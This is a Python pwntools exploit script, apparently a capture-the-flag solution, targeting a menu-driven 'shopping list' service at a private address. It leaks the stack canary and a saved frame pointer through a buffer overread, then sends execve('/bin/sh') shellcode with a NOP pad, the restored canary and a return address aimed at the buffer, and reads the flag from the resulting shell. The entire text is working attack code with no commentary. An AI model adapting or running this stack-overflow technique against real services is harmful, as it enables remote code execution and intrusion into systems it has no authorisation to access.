from pwn import asm, context, p64, remote, u64


context.arch = "amd64"

P = remote("10.212.173.64", 32_213)


def menu_choice(n):
    P.recvuntil(b"Enter a choice (1-3): ")
    P.sendline(str(n).encode())


def add_item(data):
    menu_choice(1)
    P.recvuntil(b"write to the shopping list: ")
    P.sendline(str(len(data)).encode())
    P.recvuntil(b"your data:")
    P.send(data)


def recv_items():
    menu_choice(2)
    P.recvuntil(b"shopping list:\n")
    line = P.recvline()
    return line


def main() -> None:
    offset = 52
    payload = b"A" * (offset + 1)
    add_item(payload)
    line = recv_items()

    start_idx = len(payload)
    canary = b"\x00" + line.strip()[start_idx : start_idx + 7]

    if len(canary) < 8:
        raise ValueError("Canary address contained a null byte")

    print(f"canary = {u64(canary):#x}")

    offset2 = 7
    payload += b"B" * offset2
    add_item(payload)
    line = recv_items()

    start_idx = len(payload)
    rbp_addr = u64(line.strip()[start_idx : start_idx + 8].ljust(8, b"\x00"))
    print(f"rbp_addr = {rbp_addr:#x}")

    buf_addr = rbp_addr - 1_116
    print(f"buf_addr = {buf_addr:#x}")

    assembly = """
        mov rax, 59
        mov rdi, 0x0068732f6e69622f
        push rdi

        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx

        syscall
    """
    nop = asm("nop")

    payload = asm(assembly)
    payload += nop * (offset - len(payload))
    payload += canary
    payload += b"B" * (offset2 + 1)
    payload += p64(buf_addr)

    add_item(payload)
    menu_choice(3)

    P.sendline(b"cat flag")

    P.interactive()


if __name__ == "__main__":
    main()
